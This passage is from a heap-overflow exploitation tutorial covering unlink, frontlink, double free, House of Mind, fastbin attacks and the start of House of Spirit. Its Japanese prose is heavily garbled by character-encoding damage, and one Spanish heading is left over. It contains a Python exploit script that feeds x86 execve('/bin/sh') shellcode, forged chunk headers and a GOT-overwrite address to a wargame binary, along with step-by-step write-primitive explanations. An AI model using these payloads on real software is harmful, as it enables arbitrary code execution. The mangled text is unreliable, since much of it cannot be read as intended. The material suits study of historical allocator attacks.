ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®å¾Œã«ã€æ¬¡ã®ãƒãƒ£ãƒ³ã‚¯ã®prev_sizeã¨sizeã«åˆ°é”ã™ã‚‹ã¾ã§ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®å ´æ‰€ã«ã¯0xfffffff0ï¼ˆprev_sizeã‚’ä¸Šæ›¸ãã—ã¦ç©ºã„ã¦ã„ã‚‹ã¨ã„ã†ãƒ“ãƒƒãƒˆã‚’æŒãŸã›ã‚‹ï¼‰ã¨"-4"ï¼ˆ0xfffffffcï¼‰ã‚’æŒ¿å…¥ã—ã¾ã™ï¼ˆ2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ãŒå®Ÿéš›ã«ç©ºã„ã¦ã„ã‚‹ã¨ã„ã†æƒ…å ±ã‚’3ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã§ç¢ºèªã™ã‚‹ãŸã‚ã«ã€sizeã«"-4"ã‚’æŒ¿å…¥ã—ã¾ã™ï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€free()ãŒèª¿æŸ»ã™ã‚‹ã¨ã€3ç•ªç›®ã®sizeã«ç§»å‹•ã—ã¾ã™ãŒã€å®Ÿéš›ã«ã¯2ç•ªç›®ã®-4ã«ç§»å‹•ã—ã€2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ãŒç©ºã„ã¦ã„ã‚‹ã¨æ€ã„ã¾ã™ã€‚ãã®å¾Œã€**unlink()**ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚
unlink()ã‚’å‘¼ã³å‡ºã™ã¨ãã€P->fdã«ã¯2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã®æœ€åˆã®ãƒ‡ãƒ¼ã‚¿ãŒä½¿ç”¨ã•ã‚Œã‚‹ãŸã‚ã€ãã“ã«ä¸Šæ›¸ãã—ãŸã„ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå…¥ã‚Šã¾ã™ï¼ˆFD->bkã«ã¯FDã«ä¿å­˜ã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã«12ã‚’åŠ ç®—ã—ã¾ã™ï¼‰ã€‚ãã—ã¦ã€ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã§è¦‹ã¤ã‹ã£ãŸ2ç•ªç›®ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚ã“ã‚Œã¯ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆP->bkå½ï¼‰ã«ã—ãŸã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ã‚ã‚‹ã“ã¨ãŒæœ›ã¾ã—ã„ã§ã™ã€‚

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes padding**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #å‰ã®ãƒãƒ£ãƒ³ã‚¯ãŒç©ºãã§ã‚ã‚‹ã“ã¨ã‚’ç¤ºã™ãƒ“ãƒƒãƒˆãŒ1ã§ã‚ã‚‹ã“ã¨ãŒæœ›ã¾ã—ã„**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4ã€3ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒ4ãƒã‚¤ãƒˆæ‰‹å‰ã«ã‚ã‚‹ã¨æ€ã‚ã›ã‚‹ãŸã‚ï¼ˆ2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ãŒç©ºãã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹å ´æ‰€ï¼‰**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å…ˆé ­ã«8ãƒã‚¤ãƒˆã®ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã‚’è¿½åŠ **

**got\_free = pack("\<I", 0x08048300 - 12) #free()ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’plt-12ã«è¨­å®šï¼ˆfreeãŒ2å›ç›®ã«å‘¼ã³å‡ºã•ã‚ŒãŸã¨ãã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼‰**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯8ãƒã‚¤ãƒˆã®ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã§å§‹ã¾ã‚Šã¾ã™**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã‚’å¤‰æ›´ã—ã€got\_freeã¯addr\_sc + 12ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¿å­˜ã™ã‚‹å ´æ‰€ã‚’æŒ‡ã™**

**os.system("./8.3.o " + payload)**

**unset()ã‚’ä½¿ç”¨ã—ã¦é€†é †ã«è§£æ”¾ï¼ˆwargameï¼‰**

3ã¤ã®é€£ç¶šã—ãŸãƒãƒ£ãƒ³ã‚¯ã‚’åˆ¶å¾¡ã—ã€äºˆç´„ã•ã‚ŒãŸé †åºã¨ã¯é€†ã«è§£æ”¾ã•ã‚Œã¾ã™ã€‚

ãã®å ´åˆï¼š

ãƒãƒ£ãƒ³ã‚¯cã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’é…ç½®ã—ã¾ã™

ãƒãƒ£ãƒ³ã‚¯aã‚’ä½¿ç”¨ã—ã¦ã€bã‚’ä¸Šæ›¸ãã—ã¦ã€ã‚µã‚¤ã‚ºãŒPREV\_INUSEãƒ“ãƒƒãƒˆãŒã‚ªãƒ•ã«ãªã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€ãƒãƒ£ãƒ³ã‚¯aãŒç©ºãã§ã‚ã‚‹ã¨æ€ã‚ã›ã¾ã™ã€‚

ã•ã‚‰ã«ã€ãƒ˜ãƒƒãƒ€ãƒ¼bã®ã‚µã‚¤ã‚ºã‚’-4ã«ä¸Šæ›¸ãã—ã¾ã™ã€‚

ãã®å¾Œã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯ã€Œaã€ãŒç©ºãã§ã‚ã‚Šã€ãƒã‚¤ãƒŠãƒªã§ã‚ã‚‹ã¨è€ƒãˆã‚‹ãŸã‚ã€unlink()ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚ãŸã ã—ã€ãƒ˜ãƒƒãƒ€ãƒ¼PREV\_SIZEãŒ-4ã§ã‚ã‚‹ãŸã‚ã€ã€Œaã€ã®ãƒãƒ£ãƒ³ã‚¯ãŒå®Ÿéš›ã«ã¯b+4ã‹ã‚‰å§‹ã¾ã‚‹ã¨è€ƒãˆã¾ã™ã€‚ã¤ã¾ã‚Šã€b+4ã§unlink()ãŒå®Ÿè¡Œã•ã‚Œã€b+12ã«ã¯ãƒã‚¤ãƒ³ã‚¿ãƒ¼ã€Œfdã€ãŒã‚ã‚Šã€b+16ã«ã¯ãƒã‚¤ãƒ³ã‚¿ãƒ¼ã€Œbkã€ãŒã‚ã‚Šã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€bkã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã€fdã«ã€Œputs()ã€ã®ã‚¢ãƒ‰ãƒ¬ã‚¹-12ã‚’å…¥ã‚Œã‚‹ã¨ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå®Œæˆã—ã¾ã™ã€‚

**FrontlinkæŠ€è¡“**

ä½•ã‚‚é€£ç¶šã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œãªã„å ´åˆã€unlink()ã§ã¯ãªãç›´æ¥frontlink()ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚

æ”»æ’ƒã•ã‚Œã‚‹mallocãŒæ±ºã—ã¦è§£æ”¾ï¼ˆfree()ï¼‰ã•ã‚Œãªã„å ´åˆã«æœ‰ç”¨ãªè„†å¼±æ€§ã§ã™ã€‚

å¿…è¦ãªã‚‚ã®ï¼š

ãƒ‡ãƒ¼ã‚¿å…¥åŠ›é–¢æ•°ã§ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã™ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ãƒãƒƒãƒ•ã‚¡

ã“ã®ãƒãƒƒãƒ•ã‚¡ã«éš£æ¥ã™ã‚‹è§£æ”¾ã•ã‚Œã‚‹ãƒãƒƒãƒ•ã‚¡ã§ã€å‰ã®ãƒãƒƒãƒ•ã‚¡ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã«ã‚ˆã‚Šãƒ˜ãƒƒãƒ€ãƒ¼ã®fdãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒå¤‰æ›´ã•ã‚Œã‚‹

512ã‚ˆã‚Šå¤§ããã€å‰ã®ãƒãƒƒãƒ•ã‚¡ã‚ˆã‚Šå°ã•ã„ã‚µã‚¤ã‚ºã®è§£æ”¾ã™ã‚‹ãƒãƒƒãƒ•ã‚¡

ã“ã®å‰ã®ã‚¹ãƒ†ãƒƒãƒ—3ã§å®£è¨€ã•ã‚ŒãŸãƒãƒƒãƒ•ã‚¡ã¯ã€ã“ã®ãƒãƒƒãƒ•ã‚¡ã®prev\_sizeã‚’ä¸Šæ›¸ãã§ãã‚‹

ã“ã®ã‚ˆã†ã«ã—ã¦ã€2ã¤ã®mallocã‚’ç„¡ç§©åºã«ä¸Šæ›¸ãã—ã€1ã¤ã¯åˆ¶å¾¡ã•ã‚ŒãŸæ–¹æ³•ã§è§£æ”¾ã•ã‚Œã‚‹ã ã‘ã§ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

**ãƒ€ãƒ–ãƒ«ãƒ•ãƒªãƒ¼è„†å¼±æ€§**

åŒã˜ãƒã‚¤ãƒ³ã‚¿ãƒ¼ã§2å›free()ã‚’å‘¼ã³å‡ºã™ã¨ã€2ã¤ã®binãŒåŒã˜ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

1ã¤ã‚’å†åˆ©ç”¨ã™ã‚‹å ´åˆã¯å•é¡Œã‚ã‚Šã¾ã›ã‚“ã€‚ã‚‚ã†1ã¤ã‚’ä½¿ç”¨ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€å‰ã®äºˆç´„ãŒæ›¸ãè¾¼ã‚€ãƒ‡ãƒ¼ã‚¿ã§ã€Œfdã€ã¨ã€Œbkã€ãŒå½è£…ã•ã‚Œã¾ã™ã€‚

**After free()**

ä»¥å‰è§£æ”¾ã•ã‚ŒãŸãƒã‚¤ãƒ³ã‚¿ãƒ¼ãŒåˆ¶å¾¡ãªã—ã«å†åˆ©ç”¨ã•ã‚Œã¾ã™ã€‚

## **8 Heap Overflows: Exploits avanzados**

unlink()ã¨FrontLink()ã®æŠ€è¡“ã¯ã€unlink()é–¢æ•°ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§å‰Šé™¤ã•ã‚Œã¾ã—ãŸã€‚

**The house of mind**

ã‚³ãƒ¼ãƒ‰ã‚’ä»»æ„ã«å®Ÿè¡Œã™ã‚‹ã«ã¯ã€free()ã‚’1å›ã ã‘å‘¼ã³å‡ºã™ã ã‘ã§ååˆ†ã§ã™ã€‚å‰ã®ã‚‚ã®ã«ã‚ˆã£ã¦ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã•ã‚Œã€è§£æ”¾ã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã‚’æ¢ã™ã“ã¨ãŒé‡è¦ã§ã™ã€‚

free()ã®å‘¼ã³å‡ºã—ã¯public\_fREe(mem)ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚ã“ã‚Œã¯æ¬¡ã®ã‚ˆã†ã«æ©Ÿèƒ½ã—ã¾ã™ï¼š

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> ãƒãƒ£ãƒ³ã‚¯ãŒå§‹ã¾ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆmem-8ï¼‰ã¸ã®ãƒã‚¤ãƒ³ã‚¿ãƒ¼ã‚’è¿”ã—ã¾ã™

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

â€¦

_int_free(ar_ptr, mem);

}

\[1\]ã§ã¯ã€ã‚µã‚¤ã‚ºãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¨NON\_MAIN_ARENAãƒ“ãƒƒãƒˆã‚’ç¢ºèªã—ã€ã“ã®ãƒã‚§ãƒƒã‚¯ãŒtrueã‚’è¿”ã™ã‚ˆã†ã«å¤‰æ›´ã§ãã€heap_for_ptr()ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€memã®ä¸‹ä½2.5ãƒã‚¤ãƒˆãŒ0ã«ãªã‚Šã€0x08000000ã®ã‚ˆã†ã«ãªã‚Šã€0x08000000->ar_ptrï¼ˆstruct heap_infoã¨ã—ã¦æ‰±ã‚ã‚Œã‚‹ï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ãŸã¨ãˆã°0x0804a000ã«åˆ¶å¾¡ã§ãã‚‹ãƒãƒ£ãƒ³ã‚¯ãŒã‚ã‚Šã€0x081002a0ã«ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œã‚‹å ´åˆã€0x08100000ã«åˆ°é”ã—ã€ãŸã¨ãˆã°0x0804a000ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œã‚‹ã¨ã€heap_for_ptr(ptr)->ar_ptrãŒ0x08100000ã«æ›¸ãè¾¼ã‚“ã å†…å®¹ã‚’å–å¾—ã—ã¾ã™ï¼ˆ0x081002a0ã«é©ç”¨ã•ã‚Œã‚‹andæ¼”ç®—ã«ã‚ˆã‚Šã€æœ€åˆã®4ãƒã‚¤ãƒˆã®å€¤ã€ar_ptrãŒå–å¾—ã•ã‚Œã¾ã™ï¼‰ã€‚

ã—ãŸãŒã£ã¦ã€\_int_free(ar_ptr, mem)ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚ã¤ã¾ã‚Šã€\_int_free(0x0804a000, 0x081002a0)ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚\
**\_int_free(mstate av, Void_t\* mem){**\
â€¦\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

å‰è¿°ã®ã‚ˆã†ã«ã€avã®å€¤ã‚’åˆ¶å¾¡ã§ãã‚‹ãŸã‚ã€è§£æ”¾ã•ã‚Œã‚‹ãƒãƒ£ãƒ³ã‚¯ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚

unsorted_chunksãŒã©ã®ã‚ˆã†ã«å®šç¾©ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’è€ƒãˆã‚‹ã¨ã€æ¬¡ã®ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ï¼š\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

ã—ãŸãŒã£ã¦ã€av->bins\[2\]ã«\_\_DTOR\_END\_\_-12ã®å€¤ã‚’æ›¸ãè¾¼ã‚€ã¨ã€æœ€å¾Œã®å‘½ä»¤ã§\_\_DTOR\_END\_\_ã«2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚

ã¤ã¾ã‚Šã€æœ€åˆã®ãƒãƒ£ãƒ³ã‚¯ã®å…ˆé ­ã«\_\_DTOR\_END\_\_-12ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½•åº¦ã‚‚æ›¸ãè¾¼ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚av->bins\[2\]ãŒãã“ã‹ã‚‰å–å¾—ã™ã‚‹ãŸã‚ã§ã™ã€‚

2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒè½ã¡ã‚‹å ´æ‰€ã«ã€æœ€å¾Œã®5æ¡ãŒ0ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã€æœ€åˆã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€heap_for_ptr()ãŒar_ptrãŒæœ€åˆã®ãƒãƒ£ãƒ³ã‚¯ã®å…ˆé ­ã«ã‚ã‚‹ã¨æ€ã„è¾¼ã¿ã€av->bins\[2\]ã‚’å–å¾—ã—ã¾ã™ã€‚
ç¬¬2éƒ¨åˆ†ã§ã¯ã€ç¬¬1éƒ¨åˆ†ã«ã‚ˆã£ã¦prev\_sizeã‚’jump 0x0cã§ä¸Šæ›¸ãã—ã€sizeã«ã¯NON\_MAIN\_ARENAã‚’æœ‰åŠ¹ã«ã™ã‚‹å€¤ã‚’å…¥ã‚Œã¾ã™ã€‚

æ¬¡ã«ã€ç¬¬2éƒ¨åˆ†ã«ã¯å¤šãã®nopsã‚’é…ç½®ã—ã€æœ€å¾Œã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’é…ç½®ã—ã¾ã™ã€‚

ã“ã‚Œã«ã‚ˆã‚Šã€\_int\_free(TROZO1, TROZO2)ãŒå‘¼ã³å‡ºã•ã‚Œã€\_\_DTOR\_END\_\_ã«TROZO2ã®prev\_sizeã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæ›¸ãè¾¼ã¾ã‚Œã€ãã“ã‹ã‚‰ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’é©ç”¨ã™ã‚‹ã«ã¯ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å°‘ã—è¤‡é›‘ã«ã™ã‚‹ã„ãã¤ã‹ã®è¦ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã‚‚ã¯ã‚„é©ç”¨ã§ãã¾ã›ã‚“ã€‚unlinkã«ã»ã¼åŒã˜ãƒ‘ãƒƒãƒãŒé©ç”¨ã•ã‚Œã¾ã—ãŸã€‚æ–°ã—ã„ãƒã‚¤ãƒ³ã‚¿ãŒæŒ‡ã™å ´æ‰€ãŒã€ãã®ãƒã‚¤ãƒ³ã‚¿è‡ªä½“ã‚’æŒ‡ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’æ¯”è¼ƒã—ã¾ã™ã€‚

**Fastbin**

The house of mindã®å¤‰ç¨®ã§ã™ã€‚

\_int\_free()é–¢æ•°ã®æœ€åˆã®ãƒã‚§ãƒƒã‚¯ã‚’é€šéã—ãŸå¾Œã«å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã«åˆ°é”ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

ã“ã‚Œã«ã‚ˆã‚Šã€"fb"ã«ã¯GOTå†…ã®é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå…¥ã‚Šã¾ã™ã€‚ã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã€ä¸Šæ›¸ãã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒé…ç½®ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã¯ã€ã‚¢ãƒªãƒ¼ãƒŠãŒdtorsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«è¿‘ã„ä½ç½®ã«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

The House of Mindã§ã‚¢ãƒªãƒ¼ãƒŠã®ä½ç½®ã‚’åˆ¶å¾¡ã§ãã‚‹ã“ã¨ãŒã‚ã‹ã£ãŸãŸã‚ã€sizeãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«8 + NON\_MAIN\_ARENA + PREV\_INUSEã‚’è¨­å®šã™ã‚‹ã¨ã€fastbin\_index()ã¯fastbins\[-1]ã‚’è¿”ã—ã€ã“ã‚ŒãŒav->max\_fastã‚’æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®éš£æ¥ã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒ8ã‚ˆã‚Šå¤§ãã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒ8ã§ã‚ã‚‹ã¨è¿°ã¹ãŸã®ã§ã€å½ã®ãƒãƒ£ãƒ³ã‚¯ã«ã¯8ã‚ˆã‚Šå¤§ãã„ã‚µã‚¤ã‚ºã‚’è¨­å®šã™ã‚‹ã ã‘ã§ååˆ†ã§ã™ï¼ˆã•ã‚‰ã«ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã«é…ç½®ã•ã‚Œã‚‹ãŸã‚ã€æœ€åˆã«nopsã«ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹jmpã‚’é…ç½®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

ã•ã‚‰ã«ã€åŒã˜å½ã®ãƒãƒ£ãƒ³ã‚¯ã¯av->system\_memã‚ˆã‚Šã‚‚å°ã•ããªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚av->system\_memã¯ãã®ä½ç½®ã‚ˆã‚Šã‚‚1848ãƒã‚¤ãƒˆå…ˆã«ã‚ã‚Šã¾ã™ã€‚

DTOR\_ENDã®NULLã¨GOTå†…ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå°‘ãªã„ãŸã‚ã€ã“ã‚Œã‚‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ã©ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚‚ä¸Šæ›¸ãã«é©ã—ã¦ã„ãªã„ãŸã‚ã€fastbinã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã‚’æ”»æ’ƒã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

åˆ¥ã®æ”»æ’ƒæ–¹æ³•ã¯ã€**av**ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã™ã‚‹ã“ã¨ã§ã™ã€‚

ã‚µã‚¤ã‚ºã‚’8ã§ã¯ãªã16ã«å¤‰æ›´ã™ã‚‹ã¨ã€fastbin\_index()ã¯fastbins\[0]ã‚’è¿”ã—ã€ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã‚’ä¸Šæ›¸ãã§ãã¾ã™ã€‚

ã“ã‚Œã«ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã«ã¯canaryã‚„å¥‡å¦™ãªå€¤ãŒå«ã¾ã‚Œã¦ã„ãªã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å®Ÿéš›ã€ã‚¹ã‚¿ãƒƒã‚¯ã«ã¯4ãƒã‚¤ãƒˆã®NULL + EBP + RETãŒå«ã¾ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

4ãƒã‚¤ãƒˆã®NULLãŒå¿…è¦ãªã®ã¯ã€**av**ãŒã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™ã‚ˆã†ã«ãªã‚‹ãŸã‚ã§ã‚ã‚Šã€**av**ã®æœ€åˆã®è¦ç´ ã¯0ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã§ã™ã€‚

**av->max\_fast**ã¯EBPã«ãªã‚Šã€åˆ¶ç´„ã‚’ã‚¹ã‚­ãƒƒãƒ—ã™ã‚‹ãŸã‚ã®å€¤ã«ãªã‚Šã¾ã™ã€‚

**av->fastbins\[0]**ã«ã¯**p**ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒä¸Šæ›¸ãã•ã‚Œã€RETã«ãªã‚Šã€ãã®å¾Œã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚

ã•ã‚‰ã«ã€**av->system\_mem**ï¼ˆã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®ä½ç½®ã‹ã‚‰1484ãƒã‚¤ãƒˆä¸Šã«ã‚ã‚‹ï¼‰ã«ã¯ã€ã‚¹ã‚­ãƒƒãƒ—ã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ã‚´ãƒŸãŒãŸãã•ã‚“ã‚ã‚Šã€ã“ã‚Œã«ã‚ˆã‚Šå®Ÿè¡Œã•ã‚Œã‚‹ãƒã‚§ãƒƒã‚¯ãŒã‚¹ã‚­ãƒƒãƒ—ã•ã‚Œã¾ã™ã€‚

è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®éš£æ¥ã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒ8ã‚ˆã‚Šå¤§ãã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒ16ã§ã‚ã‚‹ã¨è¿°ã¹ãŸã®ã§ã€å½ã®ãƒãƒ£ãƒ³ã‚¯ã«ã¯8ã‚ˆã‚Šå¤§ãã„ã‚µã‚¤ã‚ºã‚’è¨­å®šã™ã‚‹ã ã‘ã§ååˆ†ã§ã™ï¼ˆã•ã‚‰ã«ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã«é…ç½®ã•ã‚Œã‚‹ãŸã‚ã€æ–°ã—ã„å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®å¾Œã«é…ç½®ã•ã‚Œã‚‹nopsã«ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹jmpã‚’é…ç½®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

**The House of Spirit**

ã“ã®å ´åˆã€æ”»æ’ƒè€…ãŒå¤‰æ›´å¯èƒ½ãªmallocã¸ã®ãƒã‚¤ãƒ³ã‚¿ï¼ˆãŸã¨ãˆã°ã€ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼å¯èƒ½ãªå¤‰æ•°ã®ä¸‹ã®ã‚¹ã‚¿ãƒƒã‚¯ã«ã‚ã‚‹ãƒã‚¤ãƒ³ã‚¿ï¼‰ã‚’æŒã¤ã“ã¨ã‚’ç›®æŒ‡ã—ã¾ã™ã€‚

